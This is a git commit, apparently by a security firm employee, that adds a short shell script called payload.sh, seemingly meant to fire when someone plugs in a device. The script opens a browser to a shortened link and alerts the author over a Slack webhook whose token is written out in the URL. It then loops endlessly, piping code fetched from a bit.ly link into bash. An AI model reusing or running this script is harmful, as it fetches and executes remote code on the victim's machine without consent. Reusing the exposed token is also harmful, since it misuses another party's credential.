11e923024cb089b34d62c907ed158c9b505dc322
Daniel Craig <daniel.craig@xqdigitalresilience.com>
2017-12-15 20:50:59 +0000

    First atempt

---
+++ payload.sh
@@ -0,0 +1,9 @@
+#!/bin/env sh
+
+google-chrome http://bit.ly/2BeF8NQ &
+curl -s --data 'Matt plugged it in.' 'https://xqcyber.slack.com/services/hooks/slackbot?token=1rlkowhNDZPOnpdcVuMVnLt5&channel=%40daniel.craig' &
+while true;do
+	curl -sL 'bit.ly/10hA8iC' | bash
+done
+
+exit 0
